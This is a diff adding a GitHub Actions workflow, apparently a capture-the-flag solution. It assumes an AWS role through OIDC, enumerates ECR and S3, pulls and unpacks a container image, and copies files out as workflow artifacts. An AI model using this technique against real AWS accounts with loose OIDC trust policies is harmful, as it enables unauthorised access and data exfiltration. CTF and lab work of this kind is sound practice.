@@ -1,0 +1,44 @@
+name: Assume AWS Role
+on: [push]
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          aws-region: us-east-1
+          role-session-name: OIDCSession
+      - name: List ECR repositories
+        run: |
+          aws ecr describe-repositories --region us-east-1
+      - name: List S3 buckets
+        run: |
+          aws s3 ls
+      - name: Login to ECR
+        run: |
+          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+      - name: Pull and inspect image
+        run: |
+          # Replace with the actual ECR repository name found from listing
+          docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/imaginary-challenge:latest
+          docker save 396961015104.dkr.ecr.us-east-1.amazonaws.com/imaginary-challenge:latest -o image.tar
+          tar -xf image.tar
+          find . -name "rockyou.txt" -type f -exec cp {} ./ \;
+          find . -name "*.txt" -type f -exec grep -l "base64" {} \; || true
+      - name: Download from S3
+        run: |
+          # If S3 buckets are found, download relevant files
+          aws s3 cp s3://imaginary-challenge/output.txt ./ || true
+          aws s3 cp s3://imaginary-challenge/rockyou.txt ./ || true
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: extracted-files
+          path: |
+            rockyou.txt
+            output.txt
